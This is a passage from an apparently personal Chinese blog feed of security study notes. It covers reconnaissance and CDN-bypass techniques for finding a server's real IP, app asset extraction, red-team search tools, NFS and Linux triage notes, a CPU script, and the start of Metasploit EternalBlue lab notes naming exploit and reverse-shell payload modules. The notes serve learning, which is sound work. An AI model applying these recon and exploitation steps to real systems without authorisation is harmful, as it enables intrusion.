href="#PHP特性-composer-json泄漏-某直接搭建源码泄漏" class="headerlink" title="PHP特性-composer.json泄漏-某直接搭建源码泄漏"></a>PHP特性-composer.json泄漏-某直接搭建源码泄漏</h3><h3 id="下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava"><a href="#下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava" class="headerlink" title="下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava"></a>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</h3><p>配合文件下载漏洞</p><h3 id="资源监控-GITHUB泄漏-语法搜索-amp-关键字搜索-amp-社工"><a href="#资源监控-GITHUB泄漏-语法搜索-amp-关键字搜索-amp-社工" class="headerlink" title="资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工"></a>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工</h3><h1 id="Day8-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#Day8-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="Day8: 信息打点-系统篇_端口扫描_CDN服务_负载均衡_ WAF防火墙"></a>Day8: 信息打点-系统篇_端口扫描_CDN服务_负载均衡_ WAF防火墙</h1><p><img src="/../image/image-20240329193707328.png" alt="image-20240329193707328"></p><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、获取网络信息-服务厂商&amp;网络架构</p><p>2、获取服务信息-应用协议&amp;内网资产</p><p>不仅对一个ip扫描，可以获取该网段多个ip信息</p><p>然后<a href="https://www.cnblogs.com/wjw-zm/p/11803681.html">端口渗透</a></p><p>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p><h2 id="详细点-2"><a href="#详细点-2" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>CDN服务，WAF防火墙，负载均衡，防火墙阻碍?</p><h3 id="相关利用项目"><a href="#相关利用项目" class="headerlink" title="#相关利用项目:"></a>#相关利用项目:</h3><p>Masscan: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>Wafw00f：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>Kali上自带Nmap，Masscan，1bd等项目，超级ping:ping.chinaz.com</p><p>Masscan:端口扫描，应用协议</p><p>wafw00f:web应用防护防火墙识别</p><p>Nmap:端口扫描，应用协议，防火墙识别</p><p>lbd:负载均衡，广域网负载均衡，应用层负载均衡</p><p>在我们扫描时，有些服务器是由内网提供服务通过映射到外网来让我们访问，这样是扫不到内网的，只有外网，除非获得它的权限，不然是没办法的。</p><p>旁注:同服务器下面的不同WEB应用查询技术</p><p>10.1.1.1</p><p><a href="http://www.123.com/">www.123.com</a> 目标没什么头绪</p><p><a href="http://www.124.com/">www.124.com</a> 那就从别的网站试试</p><p>C段：同网段下面的不同服务器IP下的WEB应用查询技术</p><p>10.1.1.1</p><p><a href="http://www.123.com只有一个网站,没什么头绪,我们就查10.1.1.0/24%E6%89%80%E6%9C%89%E7%9A%84%E7%BD%91%E6%AE%B5%E7%9A%84%E6%9C%8D%E5%8A%A1">www.123.com只有一个网站，没什么头绪，我们就查10.1.1.0/24所有的网段的服务</a></p><p>还有一种ip反查域名的手段</p><h1 id="Day9：信息打点-CDN绕过篇-漏洞回链-接口探针-全网扫描-反向邮件"><a href="#Day9：信息打点-CDN绕过篇-漏洞回链-接口探针-全网扫描-反向邮件" class="headerlink" title="Day9：信息打点-CDN绕过篇_漏洞回链_接口探针_全网扫描_反向邮件"></a>Day9：信息打点-CDN绕过篇_漏洞回链_接口探针_全网扫描_反向邮件</h1><ul><li>CDN知识-工作原理及阻碍</li><li>CDN配置-域名&amp;区域&amp;类型</li><li>CDN绕过-靠谱十余种技战法</li><li>CDN绑定-HOSTS绑定指向访问</li></ul><p>绕过知识点：<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a></p><p>超级Ping：<a href="https://www.17ce.com/">https://www.17ce.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p><p>本地绕过复现：<br>1、备案域名<br>2、开通CDN<br>3、配置CDN</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h2><p>1.传统访问:用户访问域名-&gt;解析服务器P-&gt;访问目标主机</p><p>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机</p><p>3.带wAE的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p><h2 id="CDN配置"><a href="#CDN配置" class="headerlink" title="#CDN配置:"></a>#CDN配置:</h2><p>配置1:加速域名-需要启用加速的域名</p><p>配置2:加速区域-需要启用加速的地区</p><p>配置3:加速类型-需要启用加速的资源</p><h2 id="判定标准"><a href="#判定标准" class="headerlink" title="#判定标准:"></a>#判定标准:</h2><p>nslookup，各地ping(出现多个IP即启用CDN服务)</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>1.只加速一个域名<a href="http://www.xx.com,而test.xx.com没有加速/">www.xx.com，而test.xx.com没有加速</a></p><p>2.利用网站漏洞</p><p>3.历史DNS记录，之前没有CDN的历史记录</p><p>4.CDN本身，社工，得到控制面板</p><p>5.MS邮件</p><p>6.国外请求，加速区域在中国内地的时候，国外ip访问的就是真实id了</p><p>7.zmap</p><p>8.网络空间引擎搜索</p><p>演示:</p><p>真实应用-CDN绕过-漏洞&amp;遗留文件</p><p>pipinfo.php文件泄露（多个网卡就没什么用了）</p><p>SSRF:利用服务端访问相应的服务器，例如访问DNSlog，这个方法比较可靠，前提是要有相应的漏洞，当然不包括SSRF，类似的也行，只要能访问相关服务器的即可</p><p>真实应用-CDN绕过-子域名查询操作</p><p>用超级ping ping sp910网站，带www时会发现返回不同ip地址，说明用了CDN，而直接ping sp910.com时就会返回一样的ip</p><p>真实应用-CDN绕过-接口查询国外访问</p><p>一些网站有外国服务器ping对应域名可以得到真实ip，因为有些地方不太可能设置cdn</p><p>真实应用-CDN绕过-主动邮件配合备案</p><p>就是让对方发送邮件给你，比如网站找回密码时，可以看看对方发送给你邮件的邮件服务器，然后查看邮件原文即可</p><p><a href="http://get-site-ip.com/%E9%80%9A%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%88%A4%E6%96%AD%EF%BC%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%AD%A3%E7%A1%AE%EF%BC%8C%E4%B8%8D%E6%8E%A8%E8%8D%90">http://get-site-ip.com/通过接口判断，不一定正确，不推荐</a></p><p>查网站备案可以验证结果</p><p>真实应用-CDN绕过-全网扫描FuckCDN</p><h2 id="hosts绑定ip"><a href="#hosts绑定ip" class="headerlink" title="hosts绑定ip"></a>hosts绑定ip</h2><p>编辑&#x2F;etc&#x2F;hosts文件，绑定ip，这样扫描就不会扫到别地方了</p><h1 id="Day10：信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#Day10：信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="Day10：信息打点-APP_小程序篇_抓包封包_XP框架_反编译_资产提取"></a>Day10：信息打点-APP_小程序篇_抓包封包_XP框架_反编译_资产提取</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、小程序-外在-资产收集</p><p>2、APP-外在&amp;内在-资产收集</p><p>appinfoscanner:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python app.py -i filpath</span><br></pre></td></tr></table></figure><p>APP-外在抓包-Fd&amp;茶杯&amp;Burp</p><p>APP-外在封包-封包监听工具</p><p>APP-内在提取-ApplnfoScanner</p><p>APP-内在搜索-反编译载入IDEA</p><p>APP-资源提取-安装包&amp;资源文件</p><p>APP-框架使用-Xposed&amp;JustTrustMe</p><p>小程序-微信-电脑版登录启动抓包分析</p><h1 id="Day11：信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Arl灯塔"><a href="#Day11：信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Arl灯塔" class="headerlink" title="Day11：信息打点-红队工具篇_Fofa_Quake_Kunyu_Suize水泽_Arl灯塔"></a>Day11：信息打点-红队工具篇_Fofa_Quake_Kunyu_Suize水泽_Arl灯塔</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、网络空间四大引整-FofasQuakesshodan&amp;zoomeye</p><p>2、自动化信息收集项目-ARL灯塔ssuize水泽&amp;Kunyu坤舆</p><p>3、单点功能信息收集项目-企查:子域名s指纹识别&amp;社工信息</p><h2 id="黑暗引擎"><a href="#黑暗引擎" class="headerlink" title="#黑暗引擎:"></a>#黑暗引擎:</h2><p><a href="https://fofa.info/">https://fofa.info</a><br><a href="https://quake.360.cn/">https://quake.360.cn</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p><p>搜索关联资产-特征资产-资产信息</p><h2 id="自动项目"><a href="#自动项目" class="headerlink" title="#自动项目:"></a>#自动项目:</h2><p><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p><p><a href="https://github.com/0x727/shuiZe_0x727">https://github.com/0x727/shuiZe_0x727</a></p><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>#相关资源:<br><a href="https://forum.ywhack.com/center.php">https://forum.ywhack.com/center.php</a></p><p>Finger配置相关信息在个人中心中查找，支FOFA和360QuakeKey，配置好后</p><ol><li>Finger追求极简命令参数只有以下几个:</li><li>-u 对单个URL进行指纹识别</li><li>-f对指定文件中的url进行批量指纹识别。</li><li>-i对ip进行fofa数据查询采集其web资产。</li><li>-if 对指定文件中的ip批量调用fofa进行数据查询采集其web资产</li><li>-fofa 调用fofa api进行资产收集</li><li>-quake 调用360 quake进行资产收集</li><li>-0指定输出方式默认不选择的话是xsx格式，支持json，xs。</li></ol><p>但finger好像用不了了，不懂怎么回事，还是用kunyu试试，安装时记得换源，或者加上</p><p><a href="https://blog.csdn.net/AD_CSY/article/details/119887450">https://blog.csdn.net/AD_CSY/article/details/119887450</a></p><p><a href="https://www.cnblogs.com/chenzhou2020/p/14207951.html">https://www.cnblogs.com/chenzhou2020/p/14207951.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、临时使用</span><br><span class="line"></span><br><span class="line">1 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package</span><br><span class="line">2、永久更改pip源</span><br><span class="line"></span><br><span class="line">升级 pip 到最新的版本 (&gt;=10.0.0) 后进行配置：</span><br><span class="line"></span><br><span class="line">1 pip install pip -U</span><br><span class="line">2 pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">如果您到 pip 默认源的网络连接较差，临时使用镜像站来升级 pip：</span><br><span class="line"></span><br><span class="line">1 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U</span><br></pre></td></tr></table></figure><p>报错可以去看看github相关的库，说不定pip下来的库少了几个文件。。。</p><p><a href="https://blog.csdn.net/wuqixiufen2/article/details/138408527">https://blog.csdn.net/wuqixiufen2/article/details/138408527</a></p><p>还有一种解决方法，创建python虚拟环境，debian下的更新pip好像不用python -m</p><p>换到了个windows10虚拟机，然后pip安装，在虚拟机中就顺利许多，python版本一致，但pip版本不一致，所以估计大部分报错都是pip版本问题，和一个ai的库对其它库的要求，所以导致pip install 失败</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NFS</title>
      <link href="/2024/05/27/NFS/"/>
      <url>/2024/05/27/NFS/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置（巨难搞）"><a href="#环境配置（巨难搞）" class="headerlink" title="环境配置（巨难搞）"></a>环境配置（巨难搞）</h1><p>你普通的yum install dnf后，执行命令可能会出现段错误，这我觉得可能版本太旧了，dmesg会发现出现在python2.7.5,试着更新下源，结果一个错误解决又出现另一个错误。。。</p><p><a href="https://ipcmen.com/dnf">https://ipcmen.com/dnf</a></p><p><a href="https://blog.csdn.net/GX_1_11_real/article/details/99670417">https://blog.csdn.net/GX_1_11_real/article/details/99670417</a></p><p><a href="https://blog.csdn.net/qq_34202873/article/details/117094056">https://blog.csdn.net/qq_34202873/article/details/117094056</a></p><p><a href="https://www.cnblogs.com/zgqbky/p/13036069.html">https://www.cnblogs.com/zgqbky/p/13036069.html</a></p><p>修改resolve.conf不够解决问题，需要继续在&#x2F;etc&#x2F;sysconfig&#x2F;network-script&#x2F;ifcfg-ens33增加DNS</p><p>安装完成后，有个情况dnf的信息很少，因为有些东西没安装全，需要换源</p><p>换源的时候注意aliyun的镜像源里Centos-Base.repo需要把里面的$releaserver换成7，最好是把yum.reepos.d文件夹备份后，在重新创建个空文件，然后换源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:%s/$releaserver/7/g   </span><br></pre></td></tr></table></figure><p>还有一点，如果你安装了docker，需要注意连docker的源一起换了，不然会报错</p><p><a href="https://blog.csdn.net/YouMing_Li/article/details/117375461">https://blog.csdn.net/YouMing_Li/article/details/117375461</a></p><p>通过这个方法可以解决，且同样要将$releaserver替换成7</p><p>换了好多的源，终于是安装成了，这时候会发现安装的dnf的体量比之前大</p><p>总结：</p><p>自己测试了，有些错误跟大家分享一下<br>①：没有dnf，直接yum install dnf发现dnf -version运行会出现段错误，搜索有些解决方法，可能太复杂看不懂，简单粗暴点就是重新装过，装的过程中发现，yum下载的dnf是旧版本的，你需要更新一下缓存，yum clean all；yum makecache或者yum update，然后再下载dnf会发现返回的信息变多了，这次估计是下对了<br>②：用yum下载那两个工具：一样的问题，也要重新获取缓存，不然会发现命令缺了一些<br>③：换源过程中，我用的是centos7，重新获取缓存时出现404错误，可能是你的&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo的文件有个$releaserver需要替换成7，在文件里:%s&#x2F;$releaserver&#x2F;7&#x2F;g,把它们替换即可<br>④：报host的错误：在&#x2F;etc&#x2F;sysconfig&#x2F;network-script&#x2F;ifcfg-ens33里添加新的dns</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>看这篇就可以<a href="https://blog.csdn.net/Dark_Tk/article/details/114100517">https://blog.csdn.net/Dark_Tk/article/details/114100517</a></p><p>centos:安装完相应的工具后，启动对应服务</p><p>客户端同样的配置</p><p>mount ip:path &#x2F;unbuntu的目录</p><p>df -Th</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.174.142:/home/youzipii/data nfs4       18G   15G  3.0G   84% /text</span><br></pre></td></tr></table></figure><p>最终测试u：</p><p>在centos的目录下创建text.txt写入hello</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost data]# touch text.txt</span><br><span class="line">[root@localhost data]# vim text.txt</span><br></pre></td></tr></table></figure><p>在ubuntu系统下查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@youzipii-virtual-machine:/text# cat text.txt </span><br><span class="line">hello</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux排查经验</title>
      <link href="/2024/05/25/linux%E6%8E%92%E6%9F%A5%E7%BB%8F%E9%AA%8C/"/>
      <url>/2024/05/25/linux%E6%8E%92%E6%9F%A5%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="2024-x2F-5-x2F-25"><a href="#2024-x2F-5-x2F-25" class="headerlink" title="2024&#x2F;5&#x2F;25"></a>2024&#x2F;5&#x2F;25</h1><p>文章来源: https:<em>&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;3015</em></p><h2 id="查CPU异常占用"><a href="#查CPU异常占用" class="headerlink" title="查CPU异常占用"></a>查CPU异常占用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top -c -o %CPU</span><br></pre></td></tr></table></figure><p>显示了系统中所有进程的 CPU 使用率，并且按照使用率从高到低排序，有时候出现超过百分百也有可能是因为多核CPU0.</p><p>% cpu 是表示单核 cpu 的占用率, 而不是占用所有 cpu 的占用率。可以通过按1查看系统是否有多个CPU</p><p>查出异常程序就可以去查看设备管理器去看该进程运行历史记录</p><h2 id="查看pid对应的进程"><a href="#查看pid对应的进程" class="headerlink" title="查看pid对应的进程"></a>查看pid对应的进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure><ul><li><code>a</code>：显示所有终端的进程。</li><li><code>u</code>：以用户易读的格式显示进程信息。</li><li><code>x</code>：显示没有控制终端的进程。</li></ul><p>如果你想要 <code>ps</code> 命令的输出按照 CPU 使用率排序，你可以使用 <code>sort</code> 命令来辅助排序，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux --sort=-%cpu</span><br></pre></td></tr></table></figure><h2 id="进入对应的PID查看具体路径信息"><a href="#进入对应的PID查看具体路径信息" class="headerlink" title="进入对应的PID查看具体路径信息"></a>进入对应的PID查看具体路径信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux | grep PID</span><br></pre></td></tr></table></figure><p>查到路径，可以拷贝相关文件分析，微步之类的，看是否是恶意远控陈旭等</p><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><p>​Linux系统启动时会启动很多系统服务进程，这些系统服务进程没有控制终端，不能直接和用户交互。其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程(守护进程)不受用户登录注销的影响，它们一直在运行着。这种进程有一个名称叫守护进程(Daemon)。<br>​守护进程也被称为精灵进程，是运行在后台的一种特殊进程，它独立于控制终端并且周期性地执行某种任务或等待处理某些发生的事件。</p><h3 id="守护进程的特点"><a href="#守护进程的特点" class="headerlink" title="守护进程的特点"></a>守护进程的特点</h3><p>(1)在Linux中，每个系统与用户进行交流的界面成为终端，每一个从此终端开始运行的进程都会依附于这个终端，这个终端被称为这些进程的控制终端；</p><p>(2)当控制终端被关闭的时候，相应的进程都会自动关闭。但是守护进程却能突破这种限制，它脱离于终端并且在后台运行，(脱离终端的目的是为了避免进程在运行的过程中的信息在任何终端中显示并且进程也不会被任何终端所产生的终端信息所打断)，它从被执行的时候开始运转，直到整个系统关闭才退出(当然可以认为是杀死相应的守护进程)；</p><p>(3)如果想让某个进程不因为用户或中断或其他变化而影响，那么就必须把这个进程变成一个守护进程。</p><h3 id="如何杀死守护进程"><a href="#如何杀死守护进程" class="headerlink" title="如何杀死守护进程"></a>如何杀死守护进程</h3><p>1.首先</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps axj | grep 守护进程名字</span><br></pre></td></tr></table></figure><p>找到相应的守护进程，然后使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 守护进程名</span><br></pre></td></tr></table></figure><p>2.利用<code>ps -ef</code>命令查找相应的守护进程，再用<code>kill -9</code>命令将其杀死；</p><p>3.创建shell脚本对进程的启动、关闭、重启进行自动管理。</p><p>下面我们继续寻找守护进程<br>进一步排查，计划任务没有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><h1 id="2024-x2F-6-x2F-5"><a href="#2024-x2F-6-x2F-5" class="headerlink" title="2024&#x2F;6&#x2F;5"></a>2024&#x2F;6&#x2F;5</h1><p>查看默认网关记录：route -n</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         192.168.174.2   0.0.0.0         UG    0      0        0 ens33</span><br></pre></td></tr></table></figure><p>查看指定网卡的信息 ifconfig 网卡名字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig ens33</span><br></pre></td></tr></table></figure><p>查看当前使用的DNS信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ cat /etc/resolv.conf</span><br><span class="line"># Generated by NetworkManager</span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 114.114.114.114</span><br><span class="line">search localdomain</span><br></pre></td></tr></table></figure><p>查看主机名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ hostname</span><br><span class="line">localhost.localdomain</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2024-x2F-6-x2F-10"><a href="#2024-x2F-6-x2F-10" class="headerlink" title="2024&#x2F;6&#x2F;10"></a>2024&#x2F;6&#x2F;10</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i ens33 -w - | pv -bert &gt; /dev/null</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个CPU平均使用率脚本</title>
      <link href="/2024/05/21/%E4%B8%80%E4%B8%AACPU%E5%B9%B3%E5%9D%87%E4%BD%BF%E7%94%A8%E7%8E%87%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/05/21/%E4%B8%80%E4%B8%AACPU%E5%B9%B3%E5%9D%87%E4%BD%BF%E7%94%A8%E7%8E%87%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">PREV_TOTAL=0 <span class="comment">#存储CPU总时间</span></span><br><span class="line">PREV_IDLE=0 <span class="comment">#存储CPU空闲时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取CPU统计数据并累加到TOTAL变量</span></span><br><span class="line">CPU=($(sed -n <span class="string">&#x27;s/^cpu\s//p&#x27;</span> /proc/stat))</span><br><span class="line">IDLE=<span class="variable">$&#123;CPU[3]&#125;</span></span><br><span class="line">TOTAL=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> VALUE <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;CPU[@]:0:8&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">TOTAL=$((TOTAL+VALUE))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算当前与上一次的CPU总时间差并4舍5入</span></span><br><span class="line">DIFF_IDLE=$((IDLE-PREV_IDLE))</span><br><span class="line">DIFF_TOTAL=$((TOTAL-PREV_TOTAL))</span><br><span class="line">DIFF_USAGE=$(((<span class="number">1000</span>*(DIFF_TOTAL-DIFF_IDLE)/DIFF_TOTAL+<span class="number">5</span>)/<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印使用率并更新变量以供下一次使用</span></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;\rCPU: <span class="variable">$DIFF_USAGE</span>% \b\b&quot;</span></span><br><span class="line">PREV_TOTAL=<span class="string">&quot;<span class="variable">$TOTAL</span>&quot;</span></span><br><span class="line">PREV_IDLE=<span class="string">&quot;<span class="variable">$IDLE</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>sed</code> 是一个流编辑器，用于对文本进行处理。命令 <code>sed -n &#39;s/^cpu\s//p&#39; /proc/stat</code> 的意思是：</p><ul><li><code>sed</code>: 调用流编辑器。</li><li><code>-n</code>: 告诉 <code>sed</code> 不要自动打印每一行。</li><li><code>&#39;s/^cpu\s//p&#39;</code>: 这是传递给 <code>sed</code> 的脚本。<ul><li><code>s</code>: 表示替换操作。</li><li><code>/^cpu\s//</code>: 这是替换的模式。<code>^</code> 表示行的开始，<code>cpu</code> 是要查找的字符串，<code>\s</code> 表示空白字符（如空格、制表符等），<code>//</code> 表示查找模式的结束。</li><li><code>p</code>: 表示打印（print）。</li></ul></li><li><code>/proc/stat</code>: 这是 <code>sed</code> 要处理的文件。<code>/proc/stat</code> 是一个伪文件系统，其中包含了系统的状态信息，包括 CPU 的使用情况。</li></ul><p>所以，这个命令的意思是：使用 <code>sed</code> 来处理 <code>/proc/stat</code> 文件，查找以 “cpu” 开头的行，然后删除这些行开头的 “cpu” 和随后的空白字符，并打印这些行。</p><p>通常，<code>/proc/stat</code> 中的 “cpu” 行会显示 CPU 的使用情况，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cpu  0 0 0 0 0 0 0 0 0 0</span><br><span class="line">cpu0 0 0 0 0 0 0 0 0 0</span><br><span class="line">cpu1 0 0 0 0 0 0 0 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>执行上述 <code>sed</code> 命令后，会打印出除去 “cpu” 和空白字符后的行，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 0 0 0 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这些数字分别表示用户空间占用 CPU 时间的比例、系统空间占用 CPU 时间的比例、空闲 CPU 时间的比例等。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝利用测试</title>
      <link href="/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><h2 id="综合渗透测试框架"><a href="#综合渗透测试框架" class="headerlink" title="综合渗透测试框架"></a>综合渗透测试框架</h2><ol><li>Auxiliary  辅助模块  为渗透测试信息搜集提供了大量的辅助模块支持</li><li>Exploits 攻击模块  利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</li><li>Payload 攻击载荷模块   攻击成功后促使靶机运行的一段植入代码</li><li>Post 后渗透攻击模块 收集更多信息或进一步访问被利用的目标系统</li><li>Encoders   编码模块    将攻击载荷进行编码，来绕过防护软件拦截</li></ol><h2 id="初始化，不然内置的db-namp等指令用不了"><a href="#初始化，不然内置的db-namp等指令用不了" class="headerlink" title="初始化，不然内置的db_namp等指令用不了"></a>初始化，不然内置的db_namp等指令用不了</h2><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">开启数据库</span><br><span class="line">service postgresql start</span><br><span class="line">初始化数据库</span><br><span class="line">msfdb init</span><br><span class="line">开启控制台</span><br><span class="line">msfconsole</span><br><span class="line">查看数据库连接状态</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure><h3 id="常用帮助指令"><a href="#常用帮助指令" class="headerlink" title="常用帮助指令"></a>常用帮助指令</h3><p>help&#x2F;?     帮助菜单</p><p>exit 退出MSF控制台</p><p>Back     返回上一级</p><p>info 显示一个或者多个模块的信息</p><p>show 显示所给类型的模块</p><p>background  将当前操作在后台运行</p><p>use  使用所选择的模块</p><p>set 设置选项</p><p>unset 取消设置的选项</p><p>session 会话，主要是多个目标，切换时可以选择</p><h2 id="Auxiliary模块：show-auxiliary"><a href="#Auxiliary模块：show-auxiliary" class="headerlink" title="Auxiliary模块：show auxiliary"></a>Auxiliary模块：show auxiliary</h2><p>命名规则:功能&#x2F;服务&#x2F;名称     scanner&#x2F;smb&#x2F;smb_ms17_010</p><h3 id="Exploits模块：show-exploits"><a href="#Exploits模块：show-exploits" class="headerlink" title="Exploits模块：show exploits"></a>Exploits模块：show exploits</h3><p>rank表示好用级别：normal（正常），excellent（优秀），good（良好），average（平均）</p><p>命名规则:操作系统&#x2F;服务&#x2F;名称   windows&#x2F;smb&#x2F;ms17_010_eternalblue </p><h3 id="Payload-模块"><a href="#Payload-模块" class="headerlink" title="Payload 模块"></a>Payload 模块</h3><p>命名规则:操作系统&#x2F;类型&#x2F;名称   windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><strong>kali：192.168.174.137</strong></p><p><strong>靶机（win2008r2 x64）：192.168.174.157</strong></p><p><strong>phpstud</strong></p><p><strong>phpMyAdmin 4.8.x:CVE-2018-12613</strong> </p><p><strong>漏洞介绍</strong></p><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p><p><strong>漏洞描述</strong></p><p>在phpMyAdmin 4.8.x版本中，程序没有严格控制用户的输入，攻击者可以利用双重编码绕过程序的白名单限制，造成文件包含漏洞。</p><p><strong>受影响的系统版本</strong></p><p>phpMyAdmin 4.8.0</p><p>phpMyAdmin 4.8.1</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" 